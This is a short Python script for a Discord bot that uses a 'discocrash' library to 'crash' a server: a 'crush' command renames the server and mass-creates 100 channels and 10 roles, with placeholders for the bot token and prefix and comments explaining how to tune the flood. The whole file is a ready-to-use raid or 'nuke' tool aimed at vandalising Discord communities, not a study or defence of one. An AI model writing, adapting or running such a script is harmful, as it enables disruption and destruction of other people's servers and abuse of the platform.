import discord
from discocrash import crashfuncs
from discord.ext import commands, tasks
import asyncio




intents = discord.Intents.all()
bot = commands.Bot(command_prefix="your prefix", intents=intents)
bot.remove_command('help')
token = "your token"


@bot.command()
async def crush(ctx):
	await crashfuncs.crash(ctx, "crashed server name", "crash channel reason", "crash role reason", "crashed-channel-name", "crashed-role-name", 100, 10) #the penultimate parameter is responsible for how many channels will be created. The last parameter is responsible for how many roles will be created


bot.run(token)
